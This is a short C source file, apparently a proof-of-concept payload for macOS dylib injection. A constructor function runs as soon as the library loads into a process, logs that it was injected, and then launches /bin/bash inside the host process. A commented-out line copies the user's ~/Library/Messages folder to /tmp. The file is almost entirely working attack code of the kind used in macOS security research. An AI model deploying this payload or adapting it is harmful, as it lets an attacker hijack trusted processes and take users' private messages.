#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor))

void myconstructor(int argc, const char **argv)
{
    syslog(LOG_ERR, "[+] dylib injected in %s\\n", argv[0]);
    printf("[+] dylib injected in %s\\n", argv[0]);
    execv("/bin/bash", 0);
    //system("cp -r ~/Library/Messages/ /tmp/Messages/");
}
